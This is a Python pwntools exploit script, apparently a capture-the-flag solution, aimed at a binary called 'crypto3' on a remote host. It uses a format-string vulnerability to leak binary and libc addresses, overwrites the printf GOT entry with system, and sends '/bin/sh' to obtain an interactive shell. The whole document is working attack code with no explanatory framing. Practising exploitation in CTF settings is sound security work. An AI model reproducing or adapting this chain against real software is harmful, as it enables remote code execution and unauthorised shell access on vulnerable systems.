from pwn import *


# Function to pad payload to a certain size
def padding(size, block=8):
    return cyclic(size, alphabet=string.ascii_uppercase, n=block).encode()


def c(p, haha=b'c'):
    p.sendlineafter('Enter your choice, (or press enter to refresh):', haha)


def l(p):
    p.sendlineafter('Enter your choice, (or press enter to refresh):', b'l')


def d(p):
    p.sendlineafter('Enter your choice, (or press enter to refresh):', b'd')


def chuck(p, payload):
    p.sendlineafter('Chuck us some bytes (max 255): ', payload)


def leak_before(p):
    p.recvuntil('[*] ETH')
    p.recvuntil('[*] ')


def leak(p):
    # Wait for specific markers
    leak_before(p)
    response = p.recvline().strip()
    return int(response, 16)


def leak2(p):
    leak_before(p)
    response = p.recvline().strip().split(b'...')[0]

    # Convert the response to an integer in little-endian format
    return int.from_bytes(response, byteorder='little')


def refresh(p):
    p.sendlineafter(b'Press any key to continue...', b'c')
    # p.sendlineafter('Enter your choice, (or press enter to refresh):', b'd')


# Set architecture
context.arch = 'amd64'

# Choose target based on arguments
if args.R:
    p = remote('lmao.lol', 9003)
elif args.H:
    p = process('./crypto3')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./crypto3',
                  gdbscript='''
                  b *menu + 98
                  c
                      ''')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('./libc6_2.39-0ubuntu8.2_amd64.so')

# Step 1: leak printf got
c(p)
chuck(p, b'%9$p')  # __libc_start_call_main+128
l(p)
leak_addr = leak(p)

binary_base = leak_addr - 0x15a2
log.info(f"binary_base address: {hex(binary_base)}")
printf_got = binary_base + 0x4018
fgets_got = binary_base + 0x4020
puts_got = binary_base + 0x4008
log.info(f"fgets got: {hex(fgets_got)}")

data_sec = binary_base + 0x4054
log.info(f"data_sec: {hex(data_sec)}")


# step2:  get the libc base address
refresh(p)
d(p)
c(p)
payload = b'%11$s...'
payload += p64(printf_got)
chuck(p, payload)
l(p)

printf_addr = leak2(p)
printf_offset = libc.symbols['printf']
libc_base = printf_addr - printf_offset

system_offset = libc.symbols['system']
system_addr = libc_base + system_offset

bin_sh_offset = next(libc.search(b'/bin/sh'))
bin_sh_addr = libc_base +bin_sh_offset

log.info(f"printf address: {hex(printf_addr)}")
log.info(f"system address: {hex(system_addr)}")
log.info(f"bin_sh_addr address: {hex(bin_sh_addr)}")



# ## step 3: hijack
refresh(p)
d(p)
c(p)
payload = fmtstr_payload(offset=10, writes={
    printf_got: system_addr
})

chuck(p, payload)
l(p)
log.info('chanfe to sys successfully')


## set buffer to call system
refresh(p)
p.sendline(b'D')
p.sendline(b'C')
p.sendline(b'/bin/sh')
p.sendline(b'L')
p.interactive()
p.close()


